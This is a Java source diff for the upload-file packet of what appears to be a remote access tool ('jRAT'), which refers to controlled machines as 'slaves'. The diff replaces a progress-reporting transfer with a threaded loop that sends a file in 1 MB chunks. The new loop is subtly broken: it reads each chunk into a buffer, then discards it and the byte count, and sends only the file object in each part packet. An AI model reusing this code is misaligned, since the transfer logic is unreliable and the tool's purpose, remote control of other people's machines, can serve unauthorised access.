@@ -2,46 +2,48 @@ package se.jrat.client.packets.outgoing;
 
 import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.frames.FrameFileTransfer;
-import se.jrat.client.ui.frames.FrameRemoteFiles;
-import se.jrat.common.io.FileIO;
-import se.jrat.common.io.TransferListener;
-import se.jrat.common.utils.MathUtils;
 
 
 public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 
-	private String dir;
-	private String name;
 	private File file;
-
-	public Packet42ServerUploadFile(String dir, String name, File file) {
-		this.dir = dir;
-		this.name = name;
+	private String remoteFile;
+	
+	public Packet42ServerUploadFile(File file, String remoteFile) {
 		this.file = file;
+		this.remoteFile = remoteFile;
 	}
 
 	@Override
 	public void write(final Slave slave, DataOutputStream dos) throws Exception {
-		slave.writeLine(dir);
-		slave.writeLine(name);
+		slave.writeLine(remoteFile);
 
-		final FrameFileTransfer frame = FrameFileTransfer.instance;
-		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);
+		if (file.exists() && file.isFile()) {
+			new Thread(new Runnable() {
+				public void run() {
+					try {
+						slave.addToSendQueue(new Packet102BeginServerUpload(file, remoteFile));
 
-		FileIO fileio = new FileIO();
-		fileio.writeFile(file, slave.getSocket(), slave.getDataOutputStream(), slave.getDataInputStream(), new TransferListener() {
-			public void transferred(long sent, long bytesSent, long totalBytes) {
-				if (frame != null) {
-					frame.reportProgress(file.getAbsolutePath(), MathUtils.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
+						FileInputStream fileInput = new FileInputStream(file);
+						byte[] chunk = new byte[1024 * 1024];
+
+						for (long pos = 0; pos < file.length(); pos += 1024 * 1024) {
+							int read = fileInput.read(chunk);
+							
+							slave.addToSendQueue(new Packet29ClientUploadPart(file));
+						}
+						fileInput.close();
+						
+						slave.addToSendQueue(new Packet31CompleteClientUpload(remoteFile));
+					} catch (Exception ex) {
+						ex.printStackTrace();
+					}
 				}
-				if (frame2 != null) {
-					frame2.reportProgress(file.getAbsolutePath(), MathUtils.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
-				}
-			}
-		}, slave.getKey());
+			}).start();
+		}
 	}
 
 	@Override
